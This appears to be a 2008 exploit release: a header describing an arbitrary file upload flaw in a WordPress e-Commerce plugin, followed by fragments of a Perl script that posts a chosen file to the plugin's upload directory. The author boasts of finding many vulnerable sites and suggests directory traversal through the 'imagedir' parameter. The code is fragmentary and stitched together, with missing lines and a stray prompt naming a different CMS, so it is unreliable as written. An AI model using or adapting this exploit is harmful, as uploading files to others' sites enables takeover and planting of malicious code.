- Wordpress Plugin e-Commerce <= 3.4 Arbitrary File Upload -
            Discovered && Coded by: t0pP8uZz
            Discovered on: 20 October 2008

  Theres no current vulnerabilitys for this plugin, but the
  vulnerability explained here no longer exists in the later
  versions of the plugin, due to a code rewrite.

  In testing this vulnerability, i wrote a scraping content
  program, and found ALOT of vulnerable sites.

  This exploit will upload a selected file to the...
  ... /wp-content/plugins/wp-shopping-cart/ directory.

  If the directory is not writable (rare cases) you can
  mod this exploit and use the insecure GET variable
  "imagedir" to directory traversal.. so you can upload
  in diffrent directorys.

INTRO

print "\nEnter URL(ie: http://site.com/mambo): ";

my $ua = LWP::UserAgent->new;

                      Content_Type => 'form-data',
                      Content      => [ Submit => "Add", image => [ $file, $fname, Content_Type => 'plain/text' ], ] );

    print "Complete! To see if exploit was successfull visit the following URL for your uploaded file.\n";
